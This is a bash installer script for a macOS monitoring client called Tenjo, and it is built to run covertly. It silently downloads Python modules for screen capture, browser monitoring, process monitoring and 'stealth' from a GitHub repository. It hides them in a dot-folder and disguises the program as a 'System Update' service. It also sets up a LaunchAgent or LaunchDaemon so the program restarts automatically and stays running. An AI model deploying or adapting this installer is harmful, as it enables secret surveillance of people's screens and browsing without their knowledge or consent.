#!/bin/bash

# Tenjo Stealth Installer for macOS - Simplified Version
# This script downloads and installs the monitoring client silently

set -e

# Configuration
APP_NAME="SystemUpdate"
INSTALL_DIR="$HOME/.system_update"
SERVICE_NAME="com.system.update.agent"
PLIST_FILE="$HOME/Library/LaunchAgents/$SERVICE_NAME.plist"
PYTHON_REQUIREMENTS="requests mss psutil pillow"
GITHUB_RAW="https://raw.githubusercontent.com/Adi-Sumardi/Tenjo/master/client"

# Colors (only for debugging)
RED='\033[0;31m'
GREEN='\033[0;32m'
BLUE='\033[0;34m'
NC='\033[0m'

# Silent mode flag
SILENT=${1:-"false"}

log() {
    if [[ "$SILENT" != "true" ]]; then
        echo -e "$1"
    fi
}

# Check if running as root
if [[ $EUID -eq 0 ]]; then
    INSTALL_DIR="/Library/Application Support/SystemUpdate"
    PLIST_FILE="/Library/LaunchDaemons/$SERVICE_NAME.plist"
fi

log "${BLUE}🔧 Installing System Update Service...${NC}"

# Stop existing service if running
launchctl unload "$PLIST_FILE" 2>/dev/null || true

# Create installation directory
mkdir -p "$INSTALL_DIR"
mkdir -p "$INSTALL_DIR/src/core"
mkdir -p "$INSTALL_DIR/src/modules" 
mkdir -p "$INSTALL_DIR/src/utils"
mkdir -p "$INSTALL_DIR/logs"
chmod 755 "$INSTALL_DIR"

# Download essential application files
log "${BLUE}📦 Downloading application files...${NC}"

# Download main application files
curl -sSL "$GITHUB_RAW/main.py" -o "$INSTALL_DIR/main.py" || {
    log "${RED}❌ Failed to download main.py${NC}"
    exit 1
}

# Download core modules
curl -sSL "$GITHUB_RAW/src/core/config.py" -o "$INSTALL_DIR/src/core/config.py" 2>/dev/null || true
curl -sSL "$GITHUB_RAW/src/utils/api_client.py" -o "$INSTALL_DIR/src/utils/api_client.py" 2>/dev/null || true
curl -sSL "$GITHUB_RAW/src/utils/stealth.py" -o "$INSTALL_DIR/src/utils/stealth.py" 2>/dev/null || true
curl -sSL "$GITHUB_RAW/src/modules/screen_capture.py" -o "$INSTALL_DIR/src/modules/screen_capture.py" 2>/dev/null || true
curl -sSL "$GITHUB_RAW/src/modules/browser_monitor.py" -o "$INSTALL_DIR/src/modules/browser_monitor.py" 2>/dev/null || true
curl -sSL "$GITHUB_RAW/src/modules/process_monitor.py" -o "$INSTALL_DIR/src/modules/process_monitor.py" 2>/dev/null || true
curl -sSL "$GITHUB_RAW/src/modules/stream_handler.py" -o "$INSTALL_DIR/src/modules/stream_handler.py" 2>/dev/null || true

# Create __init__.py files for Python modules
touch "$INSTALL_DIR/src/__init__.py"
touch "$INSTALL_DIR/src/core/__init__.py"
touch "$INSTALL_DIR/src/modules/__init__.py"
touch "$INSTALL_DIR/src/utils/__init__.py"

# Install Python dependencies silently
log "${BLUE}🐍 Installing Python dependencies...${NC}"
python3 -m pip install --user --quiet $PYTHON_REQUIREMENTS 2>/dev/null || {
    python3 -m pip install --quiet $PYTHON_REQUIREMENTS 2>/dev/null || true
}

# Create stealth main.py wrapper
cat > "$INSTALL_DIR/stealth_main.py" << 'EOF'
#!/usr/bin/env python3
import sys
import os
import time
import signal
import logging
from pathlib import Path

# Set up minimal logging
log_dir = Path(__file__).parent / "logs"
log_dir.mkdir(exist_ok=True)

logging.basicConfig(
    level=logging.WARNING,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[logging.FileHandler(log_dir / "stealth.log")]
)

def signal_handler(signum, frame):
    logging.info("Received signal %d, shutting down...", signum)
    sys.exit(0)

def main():
    signal.signal(signal.SIGTERM, signal_handler)
    signal.signal(signal.SIGINT, signal_handler)
    
    app_dir = Path(__file__).parent
    os.chdir(app_dir)
    
    logging.warning("Stealth monitoring service started")
    
    try:
        sys.path.insert(0, str(app_dir))
        import main
        main.main(stealth_mode=True)
    except Exception as e:
        logging.error("Application error: %s", e)
        time.sleep(60)
        sys.exit(1)

if __name__ == "__main__":
    main()
EOF

chmod +x "$INSTALL_DIR/stealth_main.py"

# Create LaunchAgent plist
log "${BLUE}⚙️ Configuring auto-start service...${NC}"
mkdir -p "$(dirname "$PLIST_FILE")"

cat > "$PLIST_FILE" << EOF
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key>
    <string>$SERVICE_NAME</string>
    <key>ProgramArguments</key>
    <array>
        <string>/usr/bin/python3</string>
        <string>$INSTALL_DIR/stealth_main.py</string>
    </array>
    <key>RunAtLoad</key>
    <true/>
    <key>KeepAlive</key>
    <dict>
        <key>SuccessfulExit</key>
        <false/>
    </dict>
    <key>StandardOutPath</key>
    <string>$INSTALL_DIR/logs/service.log</string>
    <key>StandardErrorPath</key>
    <string>$INSTALL_DIR/logs/service_error.log</string>
    <key>WorkingDirectory</key>
    <string>$INSTALL_DIR</string>
    <key>ProcessType</key>
    <string>Background</string>
    <key>LowPriorityIO</key>
    <true/>
    <key>Nice</key>
    <integer>10</integer>
</dict>
</plist>
EOF

chmod 644 "$PLIST_FILE"

# Load and start the service
log "${BLUE}🚀 Starting service...${NC}"
launchctl load "$PLIST_FILE" 2>/dev/null || true
launchctl start "$SERVICE_NAME" 2>/dev/null || true

# Create uninstall script
cat > "$INSTALL_DIR/uninstall.sh" << 'UNINSTALL_EOF'
#!/bin/bash
SERVICE_NAME="com.system.update.agent"
INSTALL_DIR="$HOME/.system_update"
PLIST_FILE="$HOME/Library/LaunchAgents/$SERVICE_NAME.plist"

# Stop and remove service
launchctl stop "$SERVICE_NAME" 2>/dev/null || true
launchctl unload "$PLIST_FILE" 2>/dev/null || true
rm -f "$PLIST_FILE"

# Remove installation
rm -rf "$INSTALL_DIR"

echo "System Update Service uninstalled successfully"
UNINSTALL_EOF

chmod +x "$INSTALL_DIR/uninstall.sh"

log "${GREEN}✅ System Update Service installed successfully${NC}"
log "${GREEN}📍 Installed at: $INSTALL_DIR${NC}"
log "${GREEN}🔄 Service will auto-start on boot${NC}"

if [[ "$SILENT" != "true" ]]; then
    echo ""
    echo "The service is now running silently in the background."
    echo "To uninstall, run: bash $INSTALL_DIR/uninstall.sh"
fi
